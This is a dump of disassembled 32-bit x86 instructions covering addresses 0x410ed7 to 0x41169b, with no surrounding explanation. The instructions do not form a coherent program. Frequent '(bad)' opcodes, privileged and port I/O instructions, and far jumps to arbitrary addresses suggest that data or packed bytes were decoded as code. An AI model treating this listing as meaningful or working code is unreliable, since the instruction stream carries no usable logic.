  410ed7:	aam    0x96
  410ed9:	or     al,0xd2
  410edb:	jns    0x410efe
  410edd:	ss js  0x410e92
  410ee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ee1:	mov    cl,0xdf
  410ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ee4:	imul   esi,edx,0xffffff80
  410ee7:	out    0x52,eax
  410ee9:	jmp    0x410ec3
  410eeb:	mov    ds:0xb7ad303b,al
  410ef0:	jl     0x410ec7
  410ef2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ef3:	rol    BYTE PTR [edi-0x3626674d],cl
  410ef9:	sbb    DWORD PTR gs:[edi+ebp*1],ecx
  410efd:	test   eax,0x412cec9d
  410f02:	cmp    BYTE PTR [ebp+0x55],ch
  410f05:	adc    eax,0x6145ffbf
  410f0a:	inc    ebx
  410f0b:	mov    bl,dl
  410f0d:	popf   
  410f0e:	jb     0x410f72
  410f10:	mov    bh,0x14
  410f12:	ror    bl,cl
  410f14:	xchg   edx,eax
  410f15:	int3   
  410f16:	or     ch,BYTE PTR [edi]
  410f18:	stc    
  410f19:	(bad)  
  410f1a:	cld    
  410f1b:	clc    
  410f1c:	and    al,0xf8
  410f1e:	inc    esp
  410f1f:	or     eax,eax
  410f21:	aam    0xd2
  410f23:	ret    0xc019
  410f26:	or     al,0x5a
  410f28:	sar    DWORD PTR [eax],0x98
  410f2b:	mov    ch,0xce
  410f2d:	xchg   edx,eax
  410f2e:	xchg   edi,eax
  410f2f:	add    DWORD PTR [ebx],ebp
  410f31:	adc    al,0xce
  410f33:	sub    esi,ebx
  410f35:	push   eax
  410f37:	aaa    
  410f38:	pushf  
  410f39:	je     0x410f55
  410f3b:	xor    al,0x4e
  410f3d:	jl     0x410f8e
  410f3f:	bound  edi,QWORD PTR [ebx+0x56fabaf2]
  410f45:	and    BYTE PTR [edx-0xfd79423],ah
  410f4b:	jns    0x410fb6
  410f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f4e:	sti    
  410f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f50:	mov    ebp,0x48b00397
  410f55:	xchg   esi,eax
  410f56:	dec    eax
  410f57:	mov    edx,gs
  410f59:	mov    ebx,0xb165d2bd
  410f5e:	sbb    BYTE PTR [ecx-0x3d],bh
  410f61:	outs   dx,DWORD PTR ds:[esi]
  410f62:	add    esp,DWORD PTR [ebx-0x437e0e7]
  410f68:	(bad)  
  410f69:	arpl   ax,si
  410f6b:	cwde   
  410f6c:	jb     0x410fb1
  410f6e:	ret    0xc46b
  410f71:	mov    ds:0x91d0836a,al
  410f76:	call   FWORD PTR [eax+0x77]
  410f79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f7a:	jmp    0x21138ff4
  410f7f:	nop
  410f80:	test   al,0xcc
  410f82:	mov    ebx,0xbd3a042b
  410f87:	xsha1  (bad)
  410f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f89:	retf   0x557e
  410f8c:	scas   eax,DWORD PTR es:[edi]
  410f8d:	enter  0x8ee0,0x50
  410f91:	mov    ah,BYTE PTR [ecx+esi*1-0x77]
  410f95:	jns    0x410fdc
  410f97:	fwait
  410f98:	pop    ebp
  410f99:	cmc    
  410f9a:	das    
  410f9b:	out    dx,eax
  410f9c:	out    0x86,eax
  410f9e:	fisttp DWORD PTR [ecx+0x3f]
  410fa1:	cmp    eax,0x1f59b07b
  410fa6:	sub    BYTE PTR [edx],dh
  410fa8:	sub    al,0x8e
  410faa:	stos   DWORD PTR es:[edi],eax
  410fab:	sub    al,0xa9
  410fad:	inc    esi
  410fae:	stc    
  410faf:	lods   eax,DWORD PTR ds:[esi]
  410fb0:	push   edx
  410fb1:	and    ch,bh
  410fb3:	jg     0x410f89
  410fb5:	icebp  
  410fb6:	sti    
  410fb7:	push   es
  410fb8:	push   ebx
  410fb9:	mov    eax,ds:0x123191b6
  410fbe:	mov    eax,0xf22ca38c
  410fc3:	das    
  410fc4:	jle    0x410fd3
  410fc6:	and    ah,BYTE PTR ds:0xeb707e86
  410fcc:	jbe    0x411028
  410fce:	cwde   
  410fcf:	aam    0xa3
  410fd1:	data16 fadd st,st(3)
  410fd4:	cwde   
  410fd5:	mov    ebx,0xb3ef8a48
  410fda:	push   edx
  410fdb:	nop
  410fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fdd:	adc    esp,DWORD PTR ds:0x936520b8
  410fe3:	mov    ecx,0x33e21278
  410fe8:	xabort 0x32
  410feb:	adc    bl,BYTE PTR ds:0x9d7f79a9
  410ff1:	in     eax,0x72
  410ff3:	inc    ebp
  410ff4:	inc    ebx
  410ff5:	mov    dl,0xe1
  410ff7:	and    bh,BYTE PTR [ebp-0x2e]
  410ffa:	mov    BYTE PTR [ebp+esi*8+0x4dc165ad],al
  411001:	ret    
  411002:	rcl    BYTE PTR [eax],cl
  411004:	sub    cl,0x8d
  411007:	pop    edi
  411008:	mov    ch,0xa2
  41100a:	arpl   ax,bp
  41100c:	mov    esp,0x6582dc7a
  411011:	xor    DWORD PTR [ebx],esp
  411013:	and    ebp,esi
  411015:	inc    edi
  411016:	shl    DWORD PTR [esi],0xb
  411019:	or     eax,0x2657dd9b
  41101e:	jb     0x411090
  411020:	gs in  eax,0x5e
  411023:	sbb    edx,ebp
  411025:	push   ds
  411026:	cld    
  411027:	pop    ss
  411028:	jbe    0x41107a
  41102a:	icebp  
  41102b:	pop    ss
  41102c:	xchg   bx,ax
  41102e:	pop    ds
  41102f:	test   BYTE PTR [edi-0x5a],ch
  411032:	jecxz  0x411086
  411034:	push   eax
  411035:	jp     0x410ffb
  411037:	xchg   edx,eax
  411038:	pop    esp
  411039:	lods   eax,DWORD PTR ds:[esi]
  41103a:	shr    DWORD PTR [ebp+0x368d2e50],0x60
  411041:	or     al,0x90
  411043:	jns    0x410fe1
  411045:	scas   al,BYTE PTR es:[edi]
  411046:	push   edi
  411047:	ins    BYTE PTR es:[edi],dx
  411048:	loopne 0x411070
  41104a:	je     0x411049
  41104c:	and    al,0x0
  41104e:	xchg   ecx,eax
  41104f:	sub    eax,0x1f60f48
  411054:	pop    ecx
  411055:	mov    dh,0xcb
  411057:	sbb    BYTE PTR [ecx],bl
  411059:	ss scas al,BYTE PTR es:[edi]
  41105b:	arpl   WORD PTR [esi],bp
  41105d:	arpl   WORD PTR [eax],ax
  41105f:	mov    esp,0x72b9202e
  411064:	sub    esp,DWORD PTR [esi+0x4b0ff691]
  41106a:	jl     0x41109d
  41106c:	push   cs
  41106d:	mov    DWORD PTR [esi+0x7b],ecx
  411070:	inc    ebx
  411071:	shr    DWORD PTR [ecx-0x6fd51c73],1
  411077:	push   eax
  411078:	mov    eax,DWORD PTR [ebp+0x25]
  41107b:	cmc    
  41107c:	icebp  
  41107d:	dec    ebx
  41107e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41107f:	in     eax,0x20
  411081:	mov    dl,0x9f
  411083:	cmp    BYTE PTR [ebx-0x15f4b297],dh
  411089:	sub    al,0x9e
  41108b:	loopne 0x4110fb
  41108d:	bnd jnp 0x411067
  411090:	(bad)  
  411091:	jecxz  0x411075
  411093:	pop    edx
  411094:	push   ss
  411095:	rcl    BYTE PTR [esi+0x7c],cl
  411098:	dec    esi
  411099:	inc    edi
  41109a:	dec    ebp
  41109b:	inc    eax
  41109c:	inc    edx
  41109d:	add    ah,BYTE PTR ds:0x118ec419
  4110a3:	sub    BYTE PTR [ecx-0x165e241e],bl
  4110a9:	xor    esp,DWORD PTR [ebx+0x5a]
  4110ac:	nop
  4110ad:	es nop
  4110af:	mov    edx,0x6ef222ac
  4110b4:	test   BYTE PTR [eax],dh
  4110b6:	enter  0xf640,0x4c
  4110ba:	cmp    al,0xdf
  4110bc:	pop    edx
  4110bd:	(bad)  
  4110bf:	push   es
  4110c0:	loopne 0x41107a
  4110c2:	paddusb mm2,QWORD PTR [edx-0x1]
  4110c6:	shr    DWORD PTR [edi-0x71e113ea],0x82
  4110cd:	stos   DWORD PTR es:[edi],eax
  4110ce:	mov    esi,0xb44e6459
  4110d3:	dec    ebx
  4110d4:	movq   mm5,mm1
  4110d7:	iret   
  4110d8:	xchg   esp,eax
  4110d9:	pop    ecx
  4110da:	aam    0xd8
  4110dc:	jle    0x4110b8
  4110de:	inc    edx
  4110df:	dec    edx
  4110e0:	add    eax,0x248af758
  4110e5:	fsub   DWORD PTR [eax-0x5d]
  4110e8:	out    0xb1,al
  4110ea:	imul   ebp,DWORD PTR [eax-0x703428ec],0x5af65fc
  4110f4:	mov    edi,0x86d153e3
  4110f9:	cli    
  4110fa:	inc    eax
  4110fb:	(bad)
  4110ff:	push   es
  411100:	psrlq  mm3,mm6
  411103:	bound  esp,QWORD PTR [edi+0x1f]
  411106:	ror    BYTE PTR [esi-0x72],cl
  411109:	(bad)  
  41110a:	adc    edi,DWORD PTR [esi+0x60]
  41110d:	addr16 (bad) 
  41110f:	nop
  411110:	push   es
  411111:	jle    0x41116d
  411113:	inc    ecx
  411114:	daa    
  411115:	aas    
  411116:	bound  ebp,QWORD PTR [ebp+0x55]
  411119:	out    dx,eax
  41111a:	cmp    edi,eax
  41111c:	stos   BYTE PTR es:[edi],al
  41111d:	push   ds
  41111e:	fisubr DWORD PTR [ebp-0x1eb1f585]
  411124:	into   
  411125:	mov    ah,BYTE PTR cs:[edx+0x138cc010]
  41112c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41112d:	and    DWORD PTR [ecx],ebx
  41112f:	xchg   esi,eax
  411130:	push   edi
  411131:	ja     0x411161
  411133:	daa    
  411134:	push   0xffffffd3
  411136:	stos   DWORD PTR es:[edi],eax
  411137:	cmp    al,0x97
  411139:	pop    ds
  41113a:	add    al,0xa9
  41113c:	mov    WORD PTR [edx+0xd],cs
  41113f:	and    eax,0x195f971e
  411144:	into   
  411145:	lds    eax,FWORD PTR [edi-0x3cd9166c]
  41114b:	mov    edx,?
  41114d:	xor    edx,DWORD PTR [ecx]
  41114f:	jne    0x411169
  411151:	out    0xad,eax
  411153:	add    DWORD PTR [ebx+0xa0512b6],0x214496ba
  41115d:	out    0xa2,al
  41115f:	or     eax,0x413091dd
  411164:	(bad)  
  411165:	(bad)  [edi]
  411167:	inc    ebx
  411168:	int3   
  411169:	push   esi
  41116a:	sbb    al,ah
  41116c:	inc    DWORD PTR [edi+0x797b0916]
  411172:	cmp    esp,DWORD PTR [ecx-0x658ce00c]
  411178:	pusha  
  411179:	frstor [edx-0x37]
  41117c:	adc    al,0x8d
  41117e:	ror    BYTE PTR [edx],1
  411180:	ins    DWORD PTR es:[edi],dx
  411181:	fisttp QWORD PTR [eax-0x73]
  411184:	sub    eax,0x1cc7fc2e
  41118a:	daa    
  41118b:	stc    
  41118c:	jp     0x411136
  41118e:	imul   esp,DWORD PTR [edx+0xd3a42e3],0x87469526
  411198:	sbb    eax,0xedb07b64
  41119d:	cmc    
  41119e:	pop    es
  41119f:	inc    ebp
  4111a0:	cmp    ah,BYTE PTR [eax]
  4111a2:	pop    ds
  4111a3:	lahf   
  4111a4:	inc    ebx
  4111a5:	dec    ebx
  4111a6:	ja     0x411170
  4111a8:	sbb    eax,0xfaea254d
  4111ad:	jo     0x41113c
  4111af:	and    al,0x8d
  4111b1:	or     al,0x83
  4111b3:	or     BYTE PTR [edx+0x65ef6ab9],0xa7
  4111ba:	pop    ecx
  4111bb:	jbe    0x4111e4
  4111bd:	push   esp
  4111be:	add    dl,bl
  4111c0:	mov    DWORD PTR [edi+0xf],edx
  4111c3:	jmp    0x4412d784
  4111c8:	add    DWORD PTR [ecx-0x31],0xfa5a99d0
  4111cf:	pop    ebp
  4111d0:	push   ebp
  4111d1:	push   esi
  4111d2:	add    bl,BYTE PTR [esi-0x6f344cbc]
  4111d8:	jnp    0x411160
  4111da:	add    al,0x68
  4111dc:	retf   0xdf88
  4111df:	jns    0x2d3c3421
  4111e5:	sbb    al,0x4e
  4111e7:	sbb    eax,0xe3d10c8e
  4111ec:	std    
  4111ed:	cmp    BYTE PTR [eax+0x2f],ch
  4111f0:	push   esp
  4111f1:	adc    ah,BYTE PTR [esi+0x69]
  4111f4:	mov    WORD PTR [eax],ds
  4111f6:	daa    
  4111f7:	pop    esp
  4111f8:	mov    bh,0x8e
  4111fa:	sub    al,0x1e
  4111fc:	fld    TBYTE PTR [ecx]
  4111fe:	bound  ecx,QWORD PTR [esi+0x58]
  411201:	inc    esp
  411202:	or     edx,ecx
  411204:	test   al,0xcb
  411206:	sbb    DWORD PTR [esi],0x65
  411209:	mov    edi,0x8c19f1b
  41120e:	ret    
  41120f:	fidiv  WORD PTR [edi]
  411211:	jnp    0x411273
  411213:	jb     0x411225
  411215:	xchg   edi,eax
  411216:	(bad)  [eax]
  411218:	rol    DWORD PTR [ecx-0x58],cl
  41121b:	mov    ah,0x43
  41121d:	fimul  DWORD PTR [ecx+0x40b9590f]
  411223:	arpl   sp,sp
  411225:	push   ds
  411226:	mov    dh,0x8c
  411228:	stos   DWORD PTR es:[edi],eax
  411229:	jbe    0x4111d9
  41122b:	rcl    DWORD PTR [esi+0xd],cl
  41122e:	rol    DWORD PTR [ebx+eiz*2],1
  411231:	mov    al,0x12
  411233:	xor    al,0x1f
  411235:	loop   0x4111d0
  411237:	popa   
  411238:	outs   dx,BYTE PTR ds:[esi]
  411239:	adc    eax,0x56861620
  41123e:	push   0x6f
  411240:	mov    ds:0xe202f5d2,eax
  411245:	mov    eax,0x70e837c1
  41124a:	psubd  mm3,QWORD PTR [edi-0x56]
  41124e:	ins    BYTE PTR es:[edi],dx
  41124f:	sbb    ebp,eax
  411251:	addr16 popf 
  411253:	cmp    BYTE PTR [eax-0x8],dl
  411256:	addr16 pop esi
  411258:	adc    al,0xa3
  41125a:	fcomi  st,st(4)
  41125c:	pop    ds
  41125d:	fs popa 
  41125f:	ret    0x74c9
  411262:	data16 sahf 
  411264:	aas    
  411265:	mov    ds:0x8a4751c5,al
  41126a:	inc    ebp
  41126b:	nop
  41126c:	pop    ds
  41126d:	sub    dl,cl
  41126f:	inc    esp
  411270:	push   DWORD PTR [ebx-0x3c]
  411273:	sub    DWORD PTR [ecx],esi
  411275:	arpl   WORD PTR [esi-0x79],dx
  411278:	dec    ebx
  411279:	push   0xffffffb4
  41127b:	enter  0x5a4e,0xc
  41127f:	mov    bh,0x64
  411281:	(bad)  
  411282:	cld    
  411283:	or     al,BYTE PTR [eax+0x74]
  411286:	sub    eax,0x8b3b38e6
  41128b:	mov    al,BYTE PTR [ebx+0x37]
  41128e:	sub    ch,BYTE PTR [edx]
  411290:	ss pop ecx
  411292:	stos   DWORD PTR es:[edi],eax
  411293:	enter  0xcbab,0xbd
  411297:	sahf   
  411298:	retf   
  411299:	xchg   edx,eax
  41129a:	fld    QWORD PTR [ebx-0xf771ff6]
  4112a0:	es sti 
  4112a2:	mov    edi,0x41971400
  4112a7:	repz cwde 
  4112a9:	mov    cr0,edx
  4112ac:	or     al,BYTE PTR ds:0x36d6cd5e
  4112b2:	and    cl,bl
  4112b4:	imul   ebx,DWORD PTR [ebp+0x65],0x206a83a3
  4112bb:	inc    ecx
  4112bc:	xor    esp,DWORD PTR [esi]
  4112be:	push   ebp
  4112bf:	pushf  
  4112c0:	jo     0x411293
  4112c2:	int    0xa2
  4112c4:	push   ebx
  4112c5:	pushf  
  4112c6:	cdq    
  4112c7:	dec    esp
  4112c8:	rol    BYTE PTR [edx],cl
  4112ca:	gs gs std 
  4112cd:	ret    
  4112ce:	into   
  4112cf:	mov    ds,WORD PTR [ecx+0x166eb478]
  4112d5:	ins    BYTE PTR es:[edi],dx
  4112d6:	test   eax,0x436e05dd
  4112db:	jns    0x411334
  4112dd:	fld    QWORD PTR [edx+0x8]
  4112e0:	and    cl,dh
  4112e2:	pop    edx
  4112e3:	inc    ebx
  4112e4:	loopne 0x4112b9
  4112e6:	jle    0x411356
  4112e8:	or     DWORD PTR [edi+0x48],ebx
  4112eb:	shl    BYTE PTR [edx-0x61],cl
  4112ee:	add    DWORD PTR [ecx-0x2f],ecx
  4112f1:	add    BYTE PTR [ebx+0x44cd6ce2],dl
  4112f7:	enter  0xf77f,0xea
  4112fb:	cli    
  4112fc:	enter  0x6a97,0x18
  411300:	push   edi
  411301:	jne    0x4112f0
  411303:	mov    esp,0xafae0fb4
  411308:	fcomp  DWORD PTR [ecx+0x7fca4543]
  41130e:	ret    0xf4bc
  411311:	cdq    
  411312:	rol    DWORD PTR [esi+0x16fa0042],cl
  411318:	cli    
  411319:	stc    
  41131a:	dec    ecx
  41131b:	and    bh,al
  41131d:	rcr    al,1
  41131f:	mov    esp,0x315f9cc9
  411324:	hlt    
  411325:	scas   al,BYTE PTR es:[edi]
  411326:	add    ah,ah
  411328:	test   eax,0xd7b7f337
  41132d:	fprem  
  41132f:	aad    0x8e
  411331:	inc    edx
  411332:	idiv   DWORD PTR ds:0x86e17074
  411338:	push   edi
  411339:	(bad)  
  41133b:	or     DWORD PTR fs:[ecx+0x84e6287],0xffffffc9
  411343:	loop   0x4113c0
  411345:	aaa    
  411346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411347:	cmp    ebx,edx
  411349:	fcom   QWORD PTR [esi-0x4c]
  41134c:	out    0x39,al
  41134e:	mov    ebx,0xbc7fb8fe
  411353:	(bad)  
  411354:	mov    BYTE PTR es:[edx+0x2310012c],bh
  41135b:	fnstsw WORD PTR [eax]
  41135d:	(bad)  [ebp+0x65]
  411360:	dec    esi
  411361:	sbb    al,0x13
  411363:	test   ah,al
  411365:	and    eax,0x550fb8f3
  41136a:	pop    edi
  41136b:	fs cmp eax,0x17dfca23
  411371:	fmul   QWORD PTR [ebp-0x1c]
  411374:	add    edx,edi
  411376:	jmp    0x8bfd:0x33899930
  41137d:	rcl    DWORD PTR [ecx+eax*4],1
  411380:	cwde   
  411381:	fnstsw WORD PTR [ebx-0x5]
  411384:	jae    0x41132a
  411386:	clc    
  411387:	lock lahf 
  411389:	dec    esp
  41138a:	pop    ecx
  41138b:	sbb    cl,BYTE PTR [eax+ebx*4+0x22]
  41138f:	inc    esi
  411390:	sbb    edx,edx
  411392:	push   edi
  411393:	data16 mov BYTE PTR [ecx],dh
  411396:	es dec ecx
  411398:	imul   edi,DWORD PTR [eax],0xffffffbc
  41139b:	mov    WORD PTR [esi+0x6ef06c12],cs
  4113a1:	xchg   ebx,eax
  4113a2:	cld    
  4113a3:	sbb    eax,0x2b50bced
  4113a8:	addr16 mov bh,0x4c
  4113ab:	(bad)  
  4113ac:	mov    WORD PTR [edi-0x1f],es
  4113af:	push   ebx
  4113b0:	push   eax
  4113b1:	pop    edi
  4113b2:	push   esi
  4113b3:	jl     0x411389
  4113b5:	cmp    ch,ch
  4113b7:	daa    
  4113b8:	repnz push edx
  4113ba:	movd   mm4,DWORD PTR [eax+edx*1-0x69]
  4113bf:	xor    DWORD PTR [bx+0x496e],esi
  4113c4:	jp     0x41135f
  4113c6:	sub    al,0xaf
  4113c8:	cwde   
  4113c9:	push   ss
  4113ca:	sub    BYTE PTR [edi+0x1b589d6a],dl
  4113d0:	sahf   
  4113d1:	pop    edx
  4113d2:	stos   DWORD PTR es:[edi],eax
  4113d3:	dec    ebx
  4113d4:	mov    edx,DWORD PTR [edx+esi*1]
  4113d7:	in     al,dx
  4113d8:	add    BYTE PTR [ebp+edi*4-0x5518fffa],al
  4113df:	mov    ds:0xc9b51e4c,eax
  4113e4:	frstor [edx-0x1f]
  4113e7:	daa    
  4113e8:	sub    eax,esi
  4113ea:	in     al,dx
  4113eb:	add    DWORD PTR [edx-0x2e],edi
  4113ee:	cwde   
  4113ef:	cmp    eax,0xc680480e
  4113f4:	pop    ecx
  4113f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113f6:	mov    ah,0x75
  4113f8:	xchg   edi,eax
  4113f9:	dec    ecx
  4113fa:	cmp    eax,0x1b40718f
  4113ff:	rol    DWORD PTR [ecx+0x52],cl
  411402:	jmp    0x16212b0d
  411407:	dec    cl
  411409:	mov    BYTE PTR [esi*4-0x39972031],al
  411410:	sub    esi,ebx
  411412:	mov    esi,0x992d43c3
  411417:	adc    cl,bh
  411419:	dec    edi
  41141a:	mov    ebx,0x64d2b026
  41141f:	call   0xfb80:0x72bd7e00
  411426:	sub    edi,DWORD PTR [eax]
  411428:	and    al,0xf8
  41142a:	add    al,dh
  41142c:	in     al,0xec
  41142e:	push   esp
  41142f:	scas   eax,DWORD PTR es:[edi]
  411430:	les    edx,FWORD PTR [esi-0x1ed299ca]
  411436:	or     BYTE PTR [eax+0x552202dc],0xe1
  41143d:	jmp    0x4113f6
  41143f:	mov    edx,0xea0d3b8f
  411444:	xchg   eax,ebx
  411446:	aam    0xa6
  411448:	repnz or eax,0xb5ea0828
  41144e:	gs inc dh
  411451:	pop    edx
  411452:	push   eax
  411453:	mov    eax,0xb94fbae6
  411458:	popf   
  411459:	or     ebp,ebx
  41145b:	mov    WORD PTR ds:0x617ea74a,fs
  411461:	cmp    edi,ebx
  411463:	sub    eax,0xe801962a
  411468:	xchg   ebp,eax
  411469:	rcl    DWORD PTR [edx+0x54],1
  41146c:	cmp    BYTE PTR [edx],bl
  41146e:	push   cs
  41146f:	data16 int3 
  411471:	mov    ebx,0x9f5f5b6b
  411476:	push   edx
  411477:	ja     0x411422
  411479:	leave  
  41147a:	sbb    BYTE PTR [esi-0x43d83e48],0xd2
  411481:	into   
  411482:	fcmovb st,st(6)
  411484:	cmp    BYTE PTR [edi-0x2f65bb5d],ch
  41148a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41148b:	je     0x4114d1
  41148d:	and    eax,0xb1b21fe1
  411492:	and    esi,DWORD PTR [esi]
  411494:	cmp    BYTE PTR [esp+ebx*8+0x22],0x5
  411499:	mov    ds:0xf0ca5b2f,eax
  41149e:	push   0xf125d11a
  4114a3:	cdq    
  4114a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114a5:	imul   esi,DWORD PTR [ecx],0xc43e25cb
  4114ab:	dec    ebp
  4114ac:	cli    
  4114ad:	push   edx
  4114ae:	jo     0x41144e
  4114b0:	aaa    
  4114b1:	adc    DWORD PTR [ebx],ebx
  4114b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114b4:	mov    edi,0x5864857
  4114b9:	mov    cl,0xa4
  4114bb:	push   es
  4114bc:	lods   eax,DWORD PTR ds:[esi]
  4114bd:	stos   BYTE PTR es:[edi],al
  4114be:	(bad)  
  4114bf:	cmp    esi,DWORD PTR [eax+ebp*1]
  4114c2:	xchg   ebx,eax
  4114c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114c4:	mov    ch,0xdb
  4114c6:	inc    ebx
  4114c7:	dec    ecx
  4114c8:	xor    eax,0xa7b1318f
  4114cd:	mov    bl,0x8d
  4114cf:	sbb    dl,BYTE PTR [edi]
  4114d1:	adc    bh,BYTE PTR [ebx+0x13b15d90]
  4114d7:	repz mov ss:0x3a5af587,al
  4114de:	xchg   edx,eax
  4114df:	test   BYTE PTR [edx],0x7b
  4114e2:	in     eax,0x40
  4114e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114e5:	aad    0x36
  4114e7:	mov    ah,0x7c
  4114e9:	sub    eax,0x3d6d0833
  4114ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114ef:	aaa    
  4114f0:	fistp  QWORD PTR [esi+0x6f]
  4114f3:	mov    al,ds:0x3b23adf9
  4114f8:	leave  
  4114f9:	std    
  4114fa:	push   edx
  4114fb:	sti    
  4114fc:	jbe    0x4114a4
  4114fe:	out    0x7e,al
  411500:	mov    cl,0xc
  411502:	jl     0x41155f
  411504:	pop    esp
  411505:	in     eax,dx
  411506:	pop    ss
  411507:	dec    esi
  411508:	xchg   ebx,eax
  411509:	dec    ebp
  41150a:	das    
  41150b:	shl    BYTE PTR [eax+edi*4],cl
  41150e:	ror    BYTE PTR [esp-0x3efde8cc],0xbc
  411516:	dec    ecx
  411517:	push   es
  411518:	hlt    
  411519:	out    dx,al
  41151a:	xlat   BYTE PTR ds:[ebx]
  41151b:	aaa    
  41151c:	fwait
  41151d:	jmp    0x9925f433
  411522:	hlt    
  411523:	push   edx
  411524:	xchg   esi,eax
  411525:	mov    bh,0x68
  411527:	mov    ah,0x1f
  411529:	pop    esi
  41152a:	xor    BYTE PTR [edi-0x46bd7481],bl
  411530:	(bad)  
  411531:	and    BYTE PTR [eax-0x69],dl
  411534:	mov    edx,0x62976b76
  411539:	cmp    al,0xb6
  41153b:	pop    esi
  41153c:	inc    ebp
  41153d:	enter  0x415a,0xa9
  411541:	mov    BYTE PTR [ebp+0x6f138904],al
  411547:	mov    dl,0xd6
  411549:	fwait
  41154a:	lods   al,BYTE PTR ds:[esi]
  41154b:	addr16 mov al,ds:0x7220
  41154f:	ins    BYTE PTR es:[edi],dx
  411550:	jmp    0x7239:0xfa27e8f8
  411557:	jecxz  0x4114da
  411559:	sti    
  41155a:	jmp    0x7f4e:0x3ae8b306
  411561:	js     0x411589
  411563:	mov    esi,0xf0428ce2
  411568:	jb     0x4115ad
  41156a:	in     eax,0x5e
  41156c:	xchg   edi,eax
  41156d:	loope  0x411580
  41156f:	and    BYTE PTR [edi-0x336c90f2],dl
  411575:	shl    BYTE PTR [esp+ecx*4+0x158b5889],cl
  41157c:	jae    0x4115ec
  41157e:	inc    edi
  41157f:	cdq    
  411580:	cdq    
  411581:	iret   
  411582:	leave  
  411583:	popf   
  411584:	adc    dh,BYTE PTR [ecx-0xa]
  411587:	into   
  411588:	test   al,0xb1
  41158a:	push   0xad8d9dcc
  41158f:	sub    al,0xd8
  411591:	aad    0x1e
  411593:	int    0x11
  411595:	lds    edx,FWORD PTR [eax-0x6cd60eb1]
  41159b:	sub    BYTE PTR [eax-0x79432cd0],0x75
  4115a2:	xor    al,0xf0
  4115a4:	adc    bl,bl
  4115a6:	(bad)  
  4115a7:	sub    al,0x45
  4115a9:	stos   BYTE PTR es:[edi],al
  4115aa:	call   FWORD PTR [ebx-0x32]
  4115ad:	xchg   ebx,eax
  4115ae:	xor    al,0x51
  4115b0:	mov    BYTE PTR [eax-0x45],ah
  4115b3:	ins    DWORD PTR es:[edi],dx
  4115b4:	scas   eax,DWORD PTR es:[edi]
  4115b5:	mov    al,0x46
  4115b7:	dec    ecx
  4115b8:	scas   eax,DWORD PTR es:[edi]
  4115b9:	ds jns 0x411580
  4115bc:	call   0xdb2b:0x37b9097c
  4115c3:	mov    ?,esp
  4115c5:	mov    eax,0xaf7503a4
  4115ca:	xor    ch,al
  4115cc:	pop    ds
  4115cd:	inc    esp
  4115ce:	mov    edi,0x7b645f28
  4115d3:	add    eax,0xd8d4b400
  4115d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115d9:	xchg   ebp,eax
  4115da:	mov    ch,0xbb
  4115dc:	jmp    0x65e61e3
  4115e1:	shl    bh,1
  4115e3:	pop    esi
  4115e4:	leave  
  4115e5:	adc    ebp,esi
  4115e7:	or     ch,ah
  4115e9:	lock cdq 
  4115eb:	ret    
  4115ec:	xor    DWORD PTR [edi],0x66
  4115ef:	mov    eax,0x3f02b52b
  4115f4:	mov    bl,0xb7
  4115f6:	pusha  
  4115f7:	es iret 
  4115f9:	push   ecx
  4115fa:	inc    esp
  4115fb:	fs pop esi
  4115fd:	xor    edi,DWORD PTR [edx+0x62]
  411600:	jns    0x411610
  411602:	mov    eax,ds:0x6bf18c3
  411607:	mov    edi,0x1f75674
  41160c:	out    dx,eax
  41160d:	jmp    0x41164a
  41160f:	mov    eax,0xdd53b027
  411614:	dec    edx
  411615:	or     eax,0x278c7639
  41161a:	cmp    ebx,DWORD PTR [eax]
  41161c:	sbb    ecx,DWORD PTR [edi]
  41161e:	sub    eax,0x13d4f165
  411623:	ficomp DWORD PTR [edx-0x3c]
  411626:	or     DWORD PTR [eax+esi*8],ebx
  411629:	xchg   ebx,eax
  41162a:	fs mov bh,0x76
  41162d:	(bad)  
  41162e:	retf   
  41162f:	daa    
  411630:	adc    ebp,DWORD PTR [esi+0x5eddfb87]
  411636:	cmp    BYTE PTR [eax+0x5c],0x9b
  41163a:	push   cs
  41163b:	push   esi
  41163c:	adc    al,0xcc
  41163e:	in     eax,0xef
  411640:	int    0xd4
  411642:	ret    
  411643:	daa    
  411644:	sbb    eax,0x97f3096b
  411649:	inc    eax
  41164a:	push   DWORD PTR [eax+edi*1-0x6a]
  41164e:	push   ecx
  41164f:	call   0xa79e:0x963ca440
  411656:	pop    es
  411657:	jno    0x411687
  411659:	ret    0xe97f
  41165c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41165d:	cmp    eax,ebx
  41165f:	xchg   esp,eax
  411660:	pop    ss
  411661:	imul   DWORD PTR [esi+esi*2]
  411664:	push   esp
  411665:	mov    dh,0x9b
  411667:	mov    ah,0xcc
  411669:	inc    ebp
  41166a:	loop   0x411643
  41166c:	mov    ecx,0x65908111
  411671:	push   ebx
  411672:	jmp    0xeb4:0x40bce6c6
  411679:	scas   al,BYTE PTR es:[edi]
  41167a:	mov    ebp,0xe0de983c
  41167f:	retf   0xf330
  411682:	sub    DWORD PTR [edi-0x14],edi
  411685:	pop    edx
  411686:	jg     0x4116b3
  411688:	call   DWORD PTR [edi]
  41168a:	cmp    eax,0x7c511e6a
  41168f:	push   esi
  411690:	stos   BYTE PTR es:[edi],al
  411691:	aam    0xf9
  411693:	sub    BYTE PTR [ebx],0x32
  411696:	sub    DWORD PTR [esp+edi*1],esi
  411699:	or     bl,0x2c
